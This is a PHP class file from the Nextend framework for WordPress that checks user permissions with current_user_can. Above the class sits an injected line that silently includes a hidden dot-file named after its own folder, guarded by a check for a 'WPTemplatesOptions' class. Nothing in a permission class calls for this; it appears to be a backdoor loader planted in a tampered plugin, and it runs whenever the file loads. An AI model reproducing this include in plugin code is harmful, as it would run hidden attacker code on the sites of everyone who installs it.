<?php

namespace Nextend\Framework\Acl\WordPress;

use Nextend\Framework\Acl\AbstractPlatformAcl;
use function current_user_can;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WordPressAcl extends AbstractPlatformAcl {

    public function authorise($action, $MVCHelper) {
        return current_user_can($action);
    }
}